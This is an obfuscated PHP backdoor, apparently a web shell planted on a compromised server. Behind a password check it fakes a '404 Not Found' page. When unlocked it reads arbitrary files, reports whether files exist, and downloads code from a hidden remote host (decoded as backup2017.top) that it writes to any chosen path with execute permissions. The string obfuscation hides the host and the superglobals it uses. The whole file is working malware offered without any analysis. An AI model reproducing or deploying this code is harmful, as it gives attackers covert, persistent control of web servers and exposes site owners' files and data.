<?php

	
@ini_set('display_errors', 0);@set_time_limit(3600);
$q1 = "O00O0O";$q2 = "O0O000";$q3 = "O0OO00";$q4 = "OO0O00";$q5 = "OO0000";$q6 = "O00OO0";$q7 = "O00O00";$q8 = "O00OOO";$q9 = "O0O0OO";$q10 = "OOO0OO";$q11 = "OO00OO";$q12 = "OO000O";$q13 = "OO0O0O";$q14 = "OOOO00";$q15 = "OO0OO0O";$$q1 = RandAbc();$$q3 =  $O00O0O{62}.$O00O0O{51}.$O00O0O{50}.$O00O0O{54}.$O00O0O{55};$$q5 = $O00O0O{28}.$O00O0O{26}.$O00O0O{27}.$O00O0O{33};$$q6 = $O00O0O{1}.$O00O0O{0}.$O00O0O{2}.$O00O0O{10}.$O00O0O{20}.$O00O0O{15};$$q4 = $$O0OO00;$$q2 = $O00O0O{12}.$O00O0O{3}.$O00O0O{31};$$q7 = $O00O0O{30}.$O00O0O{35}.$O00O0O{32}.$O00O0O{34}.$O00O0O{31}.$O00O0O{34}.$O00O0O{31}.$O00O0O{3}.$O00O0O{26}.$O00O0O{5}.$O00O0O{5}.$O00O0O{4}.$O00O0O{29}.$O00O0O{31}.$O00O0O{28}.$O00O0O{27}.$O00O0O{0}.$O00O0O{26}.$O00O0O{30}.$O00O0O{32}.$O00O0O{5}.$O00O0O{26}.$O00O0O{30}.$O00O0O{34}.$O00O0O{28}.$O00O0O{5}.$O00O0O{33}.$O00O0O{0}.$O00O0O{3}.$O00O0O{31}.$O00O0O{34}.$O00O0O{3};$$q8 = $O00O0O{19}.$O00O0O{14}.$O00O0O{15};$$q9 = $O00O0O{62}.$O00O0O{54}.$O00O0O{40}.$O00O0O{53}.$O00O0O{57}.$O00O0O{40}.$O00O0O{53};$$q10 = $$O0O0OO;$$q11 = $O00O0O{39}.$O00O0O{50}.$O00O0O{38}.$O00O0O{56}.$O00O0O{48}.$O00O0O{40}.$O00O0O{49}.$O00O0O{55}.$O00O0O{62}.$O00O0O{53}.$O00O0O{50}.$O00O0O{50}.$O00O0O{55};$$q12 = $O00O0O{51}.$O00O0O{43}.$O00O0O{51}.$O00O0O{62}.$O00O0O{54}.$O00O0O{40}.$O00O0O{47}.$O00O0O{41};$$q13 = $O00O0O{2}.$O00O0O{6}.$O00O0O{4}.$O00O0O{19};$$q14 = $O00O0O{8}.$O00O0O{13}.$O00O0O{3}.$O00O0O{4}.$O00O0O{23}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};$$q15 = $O00O0O{7}.$O00O0O{19}.$O00O0O{19}.$O00O0O{15}.$O00O0O{64}.$O00O0O{65}.$O00O0O{65}.$O00O0O{22}.$O00O0O{22}.$O00O0O{22}.$O00O0O{63};
if(isset($OOO0OO["$OO00OO"])){$BT = $OOO0OO["$OO00OO"];}elseif(isset($OOO0OO["$OO000O"])){$BT = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$OOO0OO["$OO000O"])),'',__FILE__).DIRECTORY_SEPARATOR;}else{$BT = '/';}
foreach($OO0O00 as $O00O00o=>$O00Oo0o){
	$$O00O00o = $O00Oo0o;
}

if(!(isset($passwd) && $O0O000($passwd) == $O00O00)){
	header("HTTP/1.1 404 Not Found");  
	header("Status: 404 Not Found");  
	exit; 
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
	{
		
			$pfile = $recover_file;
			$date = $OO0O0O($recover_file_url);
			gdir_file($recover_file);
			@chmod($pfile,0755);

			if($date && file_put_contents($pfile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}

if(isset($act) && $act == 'redate' && isset($redate_file)){
	if(file_exists($redate_file)){
		echo rdFile($redate_file);
	}
}

function RandAbc($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/";
    return ($str);
} 

function rdFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function cget($url,$loop=10){
	$data = false;        $i = 0; 

	while(!$data) {
             $data = tcget($url);             if($i++ >= $loop) break;        }
	return $data;
}

function tcget($url,$proxy=''){
	global $OO0OO0O, $O00OO0, $OO0000, $O00OOO;
     $data = '';    	$url = "$OO0OO0O$O00OO0$OO0000.$O00OOO/".$url;
 $url = trim($url);     if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
         $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);		 curl_setopt($ch, CURLOPT_HEADER, false);		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);         $data = curl_exec($ch);         curl_close($ch);      }
    
     if ($data == ''){
         if (function_exists('file_get_contents') && $url){
             $data = @file_get_contents($url);             }
         }
    
     if (($data == '') && $url){
         if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';                     }
                
                 @fclose($fp);                 }
             }
         }
     return $data;	
}

function m_mkdir($dir){
		if(!is_dir($dir)) mkdir($dir);
	}
	
function gdir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			m_mkdir($dir);
		}
		
		return $dir;
}

//